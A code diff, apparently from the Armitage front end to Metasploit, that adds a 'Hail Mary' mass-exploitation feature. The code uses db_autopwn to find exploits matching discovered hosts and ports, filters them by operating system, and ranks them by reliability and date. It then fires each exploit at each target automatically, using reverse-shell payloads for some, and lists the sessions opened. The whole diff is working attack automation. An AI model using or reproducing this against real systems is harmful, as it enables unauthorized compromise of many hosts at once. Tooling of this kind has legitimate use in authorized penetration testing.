@@ -11,9 +11,13 @@ import javax.swing.table.*;
 import msf.*;
 import table.*;
 
-global('%results @always_reverse');
+global('%results @always_reverse %exploits %results2');
 %results = ohash();
+%results2 = ohash();
 setMissPolicy(%results, { return @(); });
+setMissPolicy(%results2, { return @(); });
+
+# %exploits is populated in menus.sl when the client-side attacks menu is constructed
 
 # a list of exploits that should always use a reverse shell... this list needs to grow.
 @always_reverse = @("multi/samba/usermap_script", "unix/misc/distcc_exec");
@@ -76,27 +80,109 @@ sub getOS {
 	return @allowed;
 }
 
-# findAttacks("p", "good|great|excellent") - port analysis 
-# findAttacks("x", "good|great|excellent") - vulnerability analysis
-sub findAttacks {
+# findAttacks("p", "good|great|excellent", &callback) - port analysis 
+# findAttacks("x", "good|great|excellent", &callback) - vulnerability analysis
+sub resolveAttacks {
 	%results = ohash();
+	%results2 = ohash();
 	setMissPolicy(%results, { return @(); });
+	setMissPolicy(%results2, { return @(); });
 
         local('$tmp_console');
         $tmp_console = createConsole($client);
 
 	cmd($client, $tmp_console, "db_autopwn -t - $+ $1 -R $2", lambda({
-		local('$line $ip $exploit');
+		local('$line $ip $exploit $port');
+
 		foreach $line (split("\n", $3)) {
-			if ($line ismatch '\[\*\]\s+(.*?):.*?exploit/(.*?/.*?/.*?)\s.*') {
-				($ip, $exploit) = matched();
+			if ($line ismatch '\[\*\]\s+(.*?):(\d+).*?exploit/(.*?/.*?/.*?)\s.*') {
+				($ip, $port, $exploit) = matched();
 				push(%results[$ip], $exploit);
+				push(%results2[$ip], @($exploit, $port));
 			}
 		}
 
-		showError("Attack Analysis Complete...\n\nYou will now see an 'Attack' menu attached\nto each host in the Targets window.\n\nHappy hunting!");
+		[$action];
 		call($client, "console.destroy", $tmp_console);
-	}, \$tmp_console));
+	}, \$tmp_console, $action => $3));
+}
+
+sub findAttacks {
+	resolveAttacks($1, $2, {
+		showError("Attack Analysis Complete...\n\nYou will now see an 'Attack' menu attached\nto each host in the Targets window.\n\nHappy hunting!");
+	});
+}
+
+sub smarter_autopwn {
+	local('$console');
+	$console = createConsoleTab("Hail Mary", 1);
+	[[$console getWindow] append: "\n\n1) Finding exploits (via db_autopwn)\n\n"];
+
+	resolveAttacks($1, $2, lambda({
+		# now crawl through %results and start hacking each host in turn
+		local('$host $exploits @allowed $ex $os $port $exploit @attacks %dupes $e $p');
+
+		# filter the attacks...
+		foreach $host => $exploits (%results2) {
+			%dupes = %();
+			@allowed = getOS(getHostOS($host));
+
+			foreach $e ($exploits) {
+				($ex, $p) = $e;
+				($os, $port, $exploit) = split('/', $ex);
+				if ($os in @allowed && $ex !in %dupes) {
+					push(@attacks, @("$host", "$ex", best_payload($host, $ex, iff($ex in @always_reverse)), $p, %exploits[$ex]));
+					%dupes[$ex] = 1;
+				}
+			}
+			[[$console getWindow] append: "\t[ $+ $host $+ ] Found " . size($exploits) . " exploits\n" ];
+		}
+
+		[[$console getWindow] append: "\n2) Sorting Exploits\n"];
+
+		# now sort them, so the best ones are on top...
+		sort({
+			local('$a $b');
+			if ($1[1] !in %exploits) {
+				return 1;
+			}
+			if ($2[1] !in %exploits) {
+				return -1;
+			}
+
+			$a = %exploits[$1[1]];
+			$b = %exploits[$2[1]];
+
+			if ($a['rankScore'] eq $b['rankScore']) {
+				return $b['date'] <=> $a['date'];
+			}
+
+			return $b['rankScore'] <=> $a['rankScore'];
+		}, @attacks);
+
+		[[$console getWindow] append: "\n3) Launching Exploits\n\n"];
+
+		# now execute them...
+		local('$progress');
+		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];
+
+		thread(lambda({
+			local('$host $ex $payload $x $rport');
+			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
+				yield 150;
+				($host, $ex, $payload, $rport) = @attacks[0];
+				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
+				[$progress setProgress: $x + 0];
+				call($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LPORT => randomPort() . '', RPORT => "$rport", SSL => iff($rport == 443, '1')));
+				$x++; 
+				@attacks = sublist(@attacks, 1);
+			}
+			[$progress close];
+
+			[[$console getWindow] append: "\n\n4) Listing sessions\n\n"];
+			[$console sendString: "sessions -v\n"];
+		}, \@attacks, \$progress, \$console));
+	}, \$console));
 }
 
 #
